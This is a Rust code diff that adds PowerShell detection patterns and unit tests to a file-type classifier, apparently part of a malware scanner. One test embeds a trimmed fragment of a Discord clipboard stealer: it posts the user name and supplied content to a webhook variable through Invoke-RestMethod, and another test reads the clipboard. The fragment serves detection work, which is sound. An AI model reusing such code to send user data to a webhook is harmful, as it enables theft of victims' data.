@@ -197,6 +197,15 @@ const PATTERNS: &[(&[u8], Lang, u8)] = &[
     (b"Write-Host", Lang::PowerShell, 5),
     (b"Invoke-", Lang::PowerShell, 5),
     (b"New-Object", Lang::PowerShell, 5),
+    // Advanced-function and assembly-loading syntax. A clipboard stealer named
+    // `.posh` opened with `Add-Type -AssemblyName` and `[CmdletBinding()]` and
+    // scored only `Invoke-` (5), so it stayed Unknown and no rule walked it.
+    // Neither form exists outside PowerShell: C# cmdlets declare `[Cmdlet(...)]`,
+    // and `$env:` is the PowerShell environment drive (`%X%` in batch, `$X` in
+    // shell).
+    (b"[CmdletBinding(", Lang::PowerShell, 10),
+    (b"Add-Type -", Lang::PowerShell, 10),
+    (b"$env:", Lang::PowerShell, 5),
     // ── Perl ──
     (b"use strict;", Lang::Perl, 10),
     (b"use warnings;", Lang::Perl, 10),
@@ -1378,6 +1387,57 @@ mod tests {
         let data =
             b"$ErrorActionPreference = 'Stop'\nWrite-Host 'hello'\nGet-Process | Set-Variable\n";
         assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
+    }
+
+    // A Discord clipboard stealer from the gauntlet, cut to its opening. It
+    // carries no `$ErrorActionPreference`/`Write-Host`, only the advanced
+    // function and `Add-Type` idioms.
+    #[test]
+    fn powershell_advanced_function_and_add_type() {
+        let data = b"Add-Type -AssemblyName WindowsBase\r\n\
+            Add-Type -AssemblyName PresentationCore\r\n\r\n\
+            function dischat {\r\n  [CmdletBinding()]\r\n  param (\r\n\
+            [Parameter (Position=0,Mandatory = $True)]\r\n  [string]$con\r\n  )\r\n\
+            $Body = @{ 'username' = $env:username; 'content' = $con }\r\n\
+            Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body\r\n}\r\n";
+        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
+    }
+
+    #[test]
+    fn powershell_cmdletbinding_alone() {
+        let data = b"function Get-Thing {\n    [CmdletBinding()]\n    param([string]$Name)\n    $Name\n}\n";
+        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
+    }
+
+    #[test]
+    fn powershell_add_type_alone() {
+        let data = b"Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Clipboard]::GetText()\n";
+        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
+    }
+
+    // `$env:` is only strong evidence: one mention in a line of text is not a
+    // PowerShell script.
+    #[test]
+    fn powershell_env_drive_alone_is_not_enough() {
+        let data = b"Set the value through $env:PATH before you start the tool.\n";
+        assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
+    }
+
+    // A batch file that shells out to PowerShell mentions `$env:` inside the
+    // `-Command` string; the line grammar still decides it is batch.
+    #[test]
+    fn batch_quoting_powershell_env_stays_batch() {
+        let data = b"@echo off\r\nsetlocal\r\npowershell -NoProfile -Command \"Write-Output $env:TEMP\"\r\nset X=%TEMP%\r\n";
+        assert_eq!(detect_from_content(data), Some(FileType::Batch));
+    }
+
+    // A C# cmdlet declares `[Cmdlet(...)]`, never `[CmdletBinding(`.
+    #[test]
+    fn csharp_cmdlet_is_not_powershell() {
+        let data = b"using System.Management.Automation;\n\
+            [Cmdlet(VerbsCommon.Get, \"Thing\")]\n\
+            public class GetThing : PSCmdlet {\n    protected override void ProcessRecord() { }\n}\n";
+        assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
     }
 
     #[test]
